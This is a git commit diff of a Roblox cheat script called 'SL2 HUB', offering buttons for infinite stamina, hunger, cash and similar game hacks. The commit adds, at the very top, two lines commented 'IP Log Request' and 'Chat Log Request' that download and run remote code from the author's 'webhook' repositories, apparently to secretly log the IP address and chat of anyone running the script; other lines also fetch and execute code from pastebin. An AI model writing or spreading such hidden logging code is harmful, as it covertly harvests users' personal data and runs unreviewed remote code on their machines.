8ab413343f7770bbdc81330ed858ed6200b30855
Bluemanev2 <111616049+Bluemanev2@users.noreply.github.com>
2022-08-28 01:10:13 -0400

    Update HUB.lua

--- HUB.lua
+++ HUB.lua
@@ -1,232 +1,234 @@
-    rconsoleprint("Made By Menace#6742")
-    
-    task.wait(3.0)
+--// IP Log Request 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv1/main/webhook.lua"))()
 
-    --// Global Variables 
-    getgenv().settings = {
-    A = false,
-    B = false,
-    C = false, 
-    D = false, 
-    E = false, 
-    F = false, 
-    G = false, 
-    H = false, 
-    I = false,
-    J = false, 
-    K = false
-    }
-    
-    --// Services 
-    local Players = game:GetService("Players")
-    local Workspace = game:GetService("Workspace")
+--// Chat Log Request 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv2/main/webhookv2."))()
 
-    --// Variables 
-    local Player = Players.LocalPlayer
+--// Global Variables 
+getgenv().settings = {
+A = false,
+B = false,
+C = false, 
+D = false, 
+E = false, 
+F = false, 
+G = false, 
+H = false, 
+I = false,
+J = false, 
+K = false
+}
 
-    --// A 
-    function A()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            game.Players.LocalPlayer.Valuestats.Karma.Value = 99999
-        end)
-    end 
+--// Services 
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 
-    --// B
-    function B()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            game.Players.LocalPlayer.Valuestats.Stamina.Value = 100
-        end)
-    end
+--// Variables 
+local Player = Players.LocalPlayer
 
-    --// C 
-    function C()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            game.Players.LocalPlayer.Valuestats.Hunger.Value = 100
-        end) 
-    end 
-
-    --// D
-    function D()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            game.Players.LocalPlayer.Valuestats.Wallet.Value = 100000
-        end)
-    end
-
-    --// E
-    function E()
+--// A 
+function A()
     game:GetService("RunService").RenderStepped:Connect(function()
-            game.Players.LocalPlayer.Character.Resistance.Value = true
-        end) 
-    end 
+        game.Players.LocalPlayer.Valuestats.Karma.Value = 99999
+    end)
+end 
 
-    --// F 
-    function F()
-        game:GetService("Players").LocalPlayer.PlayerGui.Run.Value.Value = true 
-    end 
+--// B
+function B()
+    game:GetService("RunService").RenderStepped:Connect(function()
+        game.Players.LocalPlayer.Valuestats.Stamina.Value = 100
+    end)
+end
 
-    --// G 
-    function G()
-        local Teleport = game.TeleportService
-        local Player = game.Players.LocalPlayer
-        Teleport:Teleport(4779613061, Player)
-    end 
+--// C 
+function C()
+    game:GetService("RunService").RenderStepped:Connect(function()
+        game.Players.LocalPlayer.Valuestats.Hunger.Value = 100
+    end) 
+end 
 
-    --// H 
-    function H()
-        game.Players.LocalPlayer.Character.Humanoid.Health = 0
-    end 
+--// D
+function D()
+    game:GetService("RunService").RenderStepped:Connect(function()
+        game.Players.LocalPlayer.Valuestats.Wallet.Value = 100000
+    end)
+end
 
-    --// I 
-    function I()
-        if game:GetService("Players").LocalPlayer.Character.Head.Gui then
-           game:GetService("Players").LocalPlayer.Character.Head.Gui:Destroy()
-        end
-    end 
+--// E
+function E()
+game:GetService("RunService").RenderStepped:Connect(function()
+        game.Players.LocalPlayer.Character.Resistance.Value = true
+    end) 
+end 
 
-    --// J 
-    function J()
-        local g = game.Workspace.tools
-        for fk, fl in pairs((g:GetChildren())) do
-            if fl:IsA("Tool") and fl.Name == "Fist" and fl.Name ~= "Phone" and fl.Name ~= "Crate" then
-                game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(fl)
-                break 
-            end 
-        end
+--// F 
+function F()
+    game:GetService("Players").LocalPlayer.PlayerGui.Run.Value.Value = true 
+end 
+
+--// G 
+function G()
+    local Teleport = game.TeleportService
+    local Player = game.Players.LocalPlayer
+    Teleport:Teleport(4779613061, Player)
+end 
+
+--// H 
+function H()
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end 
+
+--// I 
+function I()
+    if game:GetService("Players").LocalPlayer.Character.Head.Gui then
+       game:GetService("Players").LocalPlayer.Character.Head.Gui:Destroy()
     end
+end 
 
-    --// K 
-    function K() 
-        loadstring(game:HttpGet("https://pastebin.com/raw/mfrMFUcJ"))()
-    end 
-
-    --// Game ID
-    if game.PlaceId == 4779613061 then 
-
-    --// Ui Library 
-    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-
-    --// Ui Window
-    local Window = OrionLib:MakeWindow({Name = "SL2 HUB", HidePremium = true, IntroEnabled = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-
-    --// Ui Tab
-    local ATab = Window:MakeTab({
-    Name = "MAIN",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false 
-    })
-
-    --// Ui Tab
-    local BTab = Window:MakeTab({
-    Name = "PLAYER",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false 
-    })
-
-    --// Ui Tab
-    local CTab = Window:MakeTab({
-    Name = "MISC",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false 
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE KARMA [NOT WORKING]",
-    Default = false,
-    Callback = function()
-    A()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE STAMINA",
-    Default = false,
-    Callback = function()
-    B()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE HUNGER",
-    Default = false,
-    Callback = function()
-    C()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE CASH [FAKE CASH]",
-    Default = false,
-    Callback = function()
-    D()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE RESISTANCE",
-    Default = false,
-    Callback = function()
-    E()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "INFINITE SKITTLES",
-    Default = false,
-    Callback = function()
-    F()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "COLLECT DROPS",
-    Default = false,
-    Callback = function()
-    J()
-    end    
-    })
-
-    --// Ui Tab Button 
-    ATab:AddButton({
-    Name = "FREE CAMERA [OP]",
-    Default = false,
-    Callback = function()
-    K()
-    end    
-    })
-
-    --// Ui Tab Button 
-    BTab:AddButton({
-    Name = "HIDE NAME",
-    Default = false,
-    Callback = function()
-    I()
-    end    
-    })
-
-    --// Ui Tab Button 
-    CTab:AddButton({
-    Name = "REJOIN SERVER",
-    Default = false,
-    Callback = function()
-    G()
-    end    
-    })
-
-    --// Ui Tab Button 
-    CTab:AddButton({
-    Name = "FORCE RESET[STILL 60 SECONDS]",
-    Default = false,
-    Callback = function()
-    H()
-    end    
-    })
-
+--// J 
+function J()
+    local g = game.Workspace.tools
+    for fk, fl in pairs((g:GetChildren())) do
+        if fl:IsA("Tool") and fl.Name == "Fist" and fl.Name ~= "Phone" and fl.Name ~= "Crate" then
+            game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(fl)
+            break 
+        end 
     end
-    OrionLib:Init()
+end
+
+--// K 
+function K() 
+    loadstring(game:HttpGet("https://pastebin.com/raw/mfrMFUcJ"))()
+end 
+
+--// Game ID
+if game.PlaceId == 4779613061 then 
+
+--// Ui Library 
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+--// Ui Window
+local Window = OrionLib:MakeWindow({Name = "SL2 HUB", HidePremium = true, IntroEnabled = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+--// Ui Tab
+local ATab = Window:MakeTab({
+Name = "MAIN",
+Icon = "rbxassetid://4483345998",
+PremiumOnly = false 
+})
+
+--// Ui Tab
+local BTab = Window:MakeTab({
+Name = "PLAYER",
+Icon = "rbxassetid://4483345998",
+PremiumOnly = false 
+})
+
+--// Ui Tab
+local CTab = Window:MakeTab({
+Name = "MISC",
+Icon = "rbxassetid://4483345998",
+PremiumOnly = false 
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE KARMA [NOT WORKING]",
+Default = false,
+Callback = function()
+A()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE STAMINA",
+Default = false,
+Callback = function()
+B()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE HUNGER",
+Default = false,
+Callback = function()
+C()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE CASH [FAKE CASH]",
+Default = false,
+Callback = function()
+D()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE RESISTANCE",
+Default = false,
+Callback = function()
+E()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "INFINITE SKITTLES",
+Default = false,
+Callback = function()
+F()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "COLLECT DROPS",
+Default = false,
+Callback = function()
+J()
+end    
+})
+
+--// Ui Tab Button 
+ATab:AddButton({
+Name = "FREE CAMERA [OP]",
+Default = false,
+Callback = function()
+K()
+end    
+})
+
+--// Ui Tab Button 
+BTab:AddButton({
+Name = "HIDE NAME",
+Default = false,
+Callback = function()
+I()
+end    
+})
+
+--// Ui Tab Button 
+CTab:AddButton({
+Name = "REJOIN SERVER",
+Default = false,
+Callback = function()
+G()
+end    
+})
+
+--// Ui Tab Button 
+CTab:AddButton({
+Name = "FORCE RESET[STILL 60 SECONDS]",
+Default = false,
+Callback = function()
+H()
+end    
+})
+
+end
+OrionLib:Init()
